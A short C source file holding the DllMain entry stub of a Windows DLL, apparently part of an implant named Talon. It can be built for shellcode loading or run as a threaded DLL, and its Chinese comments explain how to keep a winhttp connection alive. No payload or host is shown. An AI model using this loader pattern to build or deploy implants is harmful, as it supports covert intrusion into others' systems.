#include <Talon.h>

HINSTANCE hAppInstance = NULL;

BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
{
    if ( Reason == DLL_PROCESS_ATTACH )
    {
        hAppInstance = hDllBase;
        
        #ifdef SHELLCODE

        //当shellcode的方式加载时不需要开启线程就可以成功调用winhttp操作，所以这里直接可以进入主函数

        //MessageBoxA(NULL, "SHELLCODE MODE", "DLLMain!", 0);

        entry();

        #else

        //当使用DLL加载的时候不能在DLLMain中进行winhttp操作，会连接失败，需要新开一个线程来执行，并且在DLLMain中不能使用WaitForSingleObject函数，会卡住线程的执行
        //只能保证加载DLL的exe不中断运行,才不会断开连接

        //MessageBoxA(NULL, "THREAD MODE", "We've started.", 0);
        
        HANDLE hthread = NULL;
		hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)entry, NULL, NULL, NULL);

        //WaitForSingleObject(hthread, INFINITE);

        #endif

        return TRUE;
    }

    return FALSE;
}